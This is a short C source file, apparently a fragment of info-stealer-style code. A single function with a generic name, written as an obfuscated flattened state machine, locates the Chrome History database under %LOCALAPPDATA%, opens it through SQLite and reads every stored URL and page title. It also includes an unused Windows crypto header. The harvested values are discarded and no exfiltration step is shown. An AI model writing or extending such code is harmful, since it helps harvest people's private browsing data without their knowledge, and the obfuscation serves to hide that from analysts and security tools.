#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v5()
{
    int state = 0;
    char db_path[260];
    sqlite3 *db = 0;
    sqlite3_stmt *stmt = 0;
    while (state != -1)
    {
        switch (state)
        {
        case 0:
            ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History", db_path, 260);
            state = 1;
            break;
        case 1:
            sqlite3_open(db_path, &db);
            state = 2;
            break;
        case 2:
            sqlite3_prepare_v2(db, "SELECT url, title FROM urls", -1, &stmt, 0);
            state = 3;
            break;
        case 3:
            if (sqlite3_step(stmt) == 100)
            {
                state = 4;
            }
            else
            {
                state = 5;
            }
            break;
        case 4:
        {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *title = sqlite3_column_text(stmt, 1);
            state = 3;
        }
        break;
        case 5:
            sqlite3_finalize(stmt);
            state = 6;
            break;
        case 6:
            sqlite3_close(db);
            state = -1;
            break;
        }
    }
}